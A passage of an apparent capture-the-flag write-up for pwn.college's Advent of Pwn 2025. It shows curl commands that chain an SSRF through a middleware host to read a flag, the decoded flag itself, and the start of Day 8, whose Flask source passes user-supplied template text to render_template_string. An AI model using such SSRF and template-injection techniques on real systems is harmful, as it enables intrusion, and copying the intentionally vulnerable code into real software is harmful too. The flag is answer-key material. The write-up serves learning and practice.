  <span class="nt">--data-urlencode</span> <span class="s2">"hacker_image=http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag"</span>
</pre></table></code></div></div><p>Results:</p><p><a href="/assets/img/AdventOfPwn2025/pic8.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic8.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cHduLmNvbGxlZ2V7QVJYMl9JZmhXTldfVGZEQ2ZsNEx0b0s5eXZvLjBWTnhrVE15d2lOMVVETjBFeld9Cg=
</pre></table></code></div></div><p>Decode this base64 image, and we get the flag.</p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{ARX2_IfhWNW_TfDCfl4LtoK9yvo.0VNxkTMywiN1UDN0EzW}</code></p><p>However, we‚Äôre in pwn.college environment so we can <code class="language-plaintext highlighter-rouge">curl</code> directly to <code class="language-plaintext highlighter-rouge">middleware</code> (<code class="language-plaintext highlighter-rouge">72.79.72.79</code>) without having to go through the first Flask SSRF.</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="s2">"http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag"</span>
</pre></table></code></div></div><p><a href="/assets/img/AdventOfPwn2025/pic9.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic9.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><hr /><h2 id="day08"><span class="me-2">Day08</span><a href="#day08" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-7"><span class="me-2">Description</span><a href="#description-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>üî®‚öôÔ∏èüßµ <strong>Santa‚Äôs Workshop of Jingly Jinja Magic</strong> üéÅ‚ú®üõ†Ô∏è</p><p>Hidden between a tower of half-painted rocking horses and a drift of cinnamon-scented sawdust lies a cozy corner of Santa‚Äôs Workshop üéÑ‚ú®. A crooked little sign hangs above it, dusted with snowflakes and glitter: <strong>TINKER ‚Üí BUILD ‚Üí PLAY</strong>.</p><p>Here, elves shuffle about with scraps of blueprints‚Äîteddy bears waiting for their whispered secrets üß∏, wooden trains craving extra ‚Äúchoo‚Äù üöÇ, and tin robots frozen mid-twirl ü§ñ‚ú®. Each blueprint is just a fragment at first, patched with tiny gaps where holiday magic (and the occasional variable) gets poured in.</p><p>Once an elf has fussed over a design‚Äînudging, scribbling, humming carols as they go‚Äîit‚Äôs fed into the clanky old assembler, a machine that wheezes peppermint steam and occasionally complains in compiler warnings ‚ùÑÔ∏èüí•. But when the gears settle and the lights blink green, out pops something wondrous:</p><p>A toy that <em>runs</em>.</p><p>Suddenly the workshop sparkles with noise‚Äîbeeps, choos, secrets, giggles. Each creation takes its first breath of output, wide-eyed and ready to play üéÅüí´.</p><p>It‚Äôs a tiny corner of the North Pole, but this is where Christmas cheer is written, compiled, and sent twinkling into the world.</p><hr /><h3 id="analysis-7"><span class="me-2">Analysis</span><a href="#analysis-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>workshop.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/local/bin/python
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pwd</span>
<span class="kn">import</span> <span class="n">secrets</span>
<span class="kn">import</span> <span class="n">shutil</span>
<span class="kn">import</span> <span class="n">subprocess</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="n">TEMPLATES_DIR</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/templates</span><span class="sh">"</span><span class="p">)</span>
<span class="n">WORKSHOP_DIR</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/run/workshop</span><span class="sh">"</span><span class="p">)</span>
<span class="n">TINKERING_DIR</span> <span class="o">=</span> <span class="n">WORKSHOP_DIR</span> <span class="o">/</span> <span class="sh">"</span><span class="s">tinkering</span><span class="sh">"</span>
<span class="n">ASSEMBLED_DIR</span> <span class="o">=</span> <span class="n">WORKSHOP_DIR</span> <span class="o">/</span> <span class="sh">"</span><span class="s">assembled</span><span class="sh">"</span>

<span class="n">SECRET</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">token_hex</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">drop_privs</span><span class="p">():</span>
    <span class="n">pw</span> <span class="o">=</span> <span class="n">pwd</span><span class="p">.</span><span class="nf">getpwnam</span><span class="p">(</span><span class="sh">"</span><span class="s">nobody</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setgroups</span><span class="p">([])</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setgid</span><span class="p">(</span><span class="n">pw</span><span class="p">.</span><span class="n">pw_gid</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="n">pw</span><span class="p">.</span><span class="n">pw_uid</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">SECRET</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">toy_id</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/create</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">create</span><span class="p">():</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="ow">or</span> <span class="p">{}</span>
    <span class="n">template</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">template</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">template</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">missing template</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
    <span class="n">bp</span> <span class="o">=</span> <span class="n">TEMPLATES_DIR</span> <span class="o">/</span> <span class="n">template</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">bp</span><span class="p">.</span><span class="nf">exists</span><span class="p">():</span>
        <span class="n">templates</span> <span class="o">=</span> <span class="nf">sorted</span><span class="p">([</span><span class="n">path</span><span class="p">.</span><span class="n">name</span> <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">TEMPLATES_DIR</span><span class="p">.</span><span class="nf">glob</span><span class="p">(</span><span class="sh">"</span><span class="s">*</span><span class="sh">"</span><span class="p">)])</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">unknown template</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">templates</span><span class="sh">"</span><span class="p">:</span> <span class="n">templates</span><span class="p">}),</span> <span class="mi">404</span>

    <span class="n">toy_id</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">.</span><span class="nf">token_hex</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="n">src</span> <span class="o">=</span> <span class="n">TINKERING_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
    <span class="n">shutil</span><span class="p">.</span><span class="nf">copyfile</span><span class="p">(</span><span class="n">bp</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">toy_id</span><span class="sh">"</span><span class="p">:</span> <span class="n">toy_id</span><span class="p">})</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/tinker/&lt;toy_id&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">tinker</span><span class="p">(</span><span class="n">toy_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="ow">or</span> <span class="p">{}</span>
    <span class="n">op</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">op</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">src</span> <span class="o">=</span> <span class="n">TINKERING_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">src</span><span class="p">.</span><span class="nf">exists</span><span class="p">():</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">toy not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>

    <span class="n">text</span> <span class="o">=</span> <span class="n">src</span><span class="p">.</span><span class="nf">read_text</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">idx</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">length</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
        <span class="n">new_text</span> <span class="o">=</span> <span class="n">text</span><span class="p">[:</span><span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">content</span> <span class="o">+</span> <span class="n">text</span><span class="p">[</span><span class="n">idx</span> <span class="o">+</span> <span class="n">length</span> <span class="p">:]</span>
        <span class="n">src</span><span class="p">.</span><span class="nf">write_text</span><span class="p">(</span><span class="n">new_text</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">tinkered</span><span class="sh">"</span><span class="p">})</span>

    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="sh">"</span><span class="s">render</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">ctx</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">context</span><span class="sh">"</span><span class="p">,</span> <span class="p">{})</span>
        <span class="n">rendered</span> <span class="o">=</span> <span class="nf">render_template_string</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="o">**</span><span class="n">ctx</span><span class="p">)</span>
        <span class="n">src</span><span class="p">.</span><span class="nf">write_text</span><span class="p">(</span><span class="n">rendered</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">tinkered</span><span class="sh">"</span><span class="p">})</span>

    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">bad op</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/assemble/&lt;toy_id&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">assemble</span><span class="p">(</span><span class="n">toy_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="ow">or</span> <span class="p">{}</span>
    <span class="n">src</span> <span class="o">=</span> <span class="n">TINKERING_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">src</span><span class="p">.</span><span class="nf">exists</span><span class="p">():</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">toy not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>

    <span class="n">dest</span> <span class="o">=</span> <span class="n">ASSEMBLED_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">gcc</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-x</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-O2</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-pipe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-o</span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">dest</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="n">src</span><span class="p">)]</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="n">drop_privs</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">proc</span><span class="p">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">failed to build</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">assembled</span><span class="sh">"</span><span class="p">})</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/play/&lt;toy_id&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">play</span><span class="p">(</span><span class="n">toy_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">bin_path</span> <span class="o">=</span> <span class="n">ASSEMBLED_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">bin_path</span><span class="p">.</span><span class="nf">exists</span><span class="p">():</span>
        <span class="n">src</span> <span class="o">=</span> <span class="n">TINKERING_DIR</span> <span class="o">/</span> <span class="nf">toy_hash</span><span class="p">(</span><span class="n">toy_id</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">src</span><span class="p">.</span><span class="nf">exists</span><span class="p">():</span>
            <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">toy not built</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">status</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">toy not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">silent</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="ow">or</span> <span class="p">{}</span>
    <span class="n">stdin_data</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">stdin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">""</span><span class="p">)</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">run</span><span class="p">([</span><span class="nf">str</span><span class="p">(</span><span class="n">bin_path</span><span class="p">)],</span> <span class="nb">input</span><span class="o">=</span><span class="n">stdin_data</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">preexec_fn</span><span class="o">=</span><span class="n">drop_privs</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">stdout</span><span class="sh">"</span><span class="p">:</span> <span class="n">proc</span><span class="p">.</span><span class="n">stdout</span><span class="p">,</span> <span class="sh">"</span><span class="s">stderr</span><span class="sh">"</span><span class="p">:</span> <span class="n">proc</span><span class="p">.</span><span class="n">stderr</span><span class="p">,</span> <span class="sh">"</span><span class="s">returncode</span><span class="sh">"</span><span class="p">:</span> <span class="n">proc</span><span class="p">.</span><span class="n">returncode</span><span class="p">})</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>init-workshop.sh</code></summary><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">set</span> <span class="nt">-eu</span>

<span class="nb">mkdir</span> <span class="nt">-p</span> /run/workshop/tinkering /run/workshop/assembled
<span class="nb">chmod </span>0711 /run/workshop /run/workshop/tinkering
<span class="nb">chmod </span>0733 /run/workshop/assembled

/challenge/workshop.py &amp;
</pre></table></code></div></div></details> <details> <summary>Click to view <code>templates/robot.c.j2</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cm">/* Tin Robot */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">b</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"beep boop | battery: "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"input command (%s):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">stdin</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">"dance"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"robot spins!"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="s">"beep"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"BEEP BEEP!"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"unknown command: %s"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>templates/teddy.c.j2</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cm">/* Teddy Bear */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">note</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>

    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"soft hug!"</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"teddy keeps this secret: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"share a feeling (%s):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">note</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">note</span><span class="p">),</span> <span class="n">stdin</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">note</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">note</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="n">note</span><span class="p">[</span><span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"teddy repeats back: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">note</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"letters counted: %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">note</span><span class="p">));</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>templates/train.c.j2</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
